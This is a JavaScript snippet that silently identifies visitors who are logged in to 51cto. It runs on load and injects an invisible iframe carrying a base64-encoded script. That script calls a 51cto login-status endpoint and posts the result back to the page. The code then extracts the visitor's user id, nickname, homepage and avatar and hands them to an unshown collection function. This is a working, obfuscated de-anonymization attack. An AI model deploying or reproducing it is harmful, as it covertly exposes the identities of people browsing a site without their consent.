// 用户id  个人主页   个人图像   用户名
function formateCto51Data(t) {
  if ('51cto' === t.data.source)
    for (
      var e,
        a = t.data.d,
        c = /home\.51cto\.com\/space\?uid=(\d+)" target="_self">(.+?)<\/a>/gm;
      null != (e = c.exec(a));

    ) {
      var i = {
        valid: !0,
        data: {
          uid: e[1],
          homePage: 'https://home.51cto.com/space?uid='.concat(e[1]),
          photo: 'https://ucenter.51cto.com/avatar.php?uid='.concat(
            e[1],
            '&size=small'
          ),
          nickname: e[2],
        },
      }
      let innerHTML = `
      <div class='item'>
        <p class='title'>51CTO</p>
        <p>个人主页: ${i.data.homePage}</p>
        <p>个人图像: ${i.data.photo}</p>
      </div>
    `
      if (i.data.homePage) {
        getInifoData({ type: '51cto', data: i.data, html: innerHTML })
      }
    }
}
function cto51() {
  var d = document.createElement('iframe')
  d.src =
    'data:text/html;base64,PGRpdiBpZD0ibG9naW5fc3RhdHVzIj48L2Rpdj4KPHNjcmlwdD4KCWxldCBzID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0IikKCXMuc3JjID0gImh0dHBzOi8vaG9tZS41MWN0by5jb20vaW5kZXgucGhwP3M9L0luZGV4L2dldExvZ2luU3RhdHVzMjAxNS9yZWJhY2svaHR0cCUyNTNBJTI1MkYlMjUyRnd3dy41MWN0by5jb20lMjUyRiIKCXMub25sb2FkID0gZnVuY3Rpb24oKSB7CgkJbGV0IHggPSB7c291cmNlOiAiNTFjdG8iLCBkOiBsb2dpbl9zdGF0dXMuaW5uZXJIVE1MfTsKCQl3aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHgsICIqIik7Cgl9Cglkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuYXBwZW5kQ2hpbGQocyk7Cjwvc2NyaXB0Pg=='
  d.width = 0
  d.height = 0
  d.style.borderWidth = 0
  document.documentElement.appendChild(d)
}
window.addEventListener('message', formateCto51Data, !1)

// window.addEventListener('load', function () {
cto51()
// })
